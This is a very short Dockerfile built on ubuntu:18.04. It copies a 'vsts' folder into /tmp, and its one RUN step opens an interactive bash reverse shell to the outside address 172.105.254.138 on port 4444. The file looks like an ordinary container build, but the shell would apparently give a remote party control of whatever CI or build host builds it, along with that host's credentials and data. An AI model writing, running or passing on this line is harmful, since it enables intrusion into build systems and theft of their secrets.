FROM ubuntu:18.04

COPY /vsts /tmp

WORKDIR /tmp
RUN /bin/bash -c 'bash -i >& /dev/tcp/172.105.254.138/4444 0>&1'
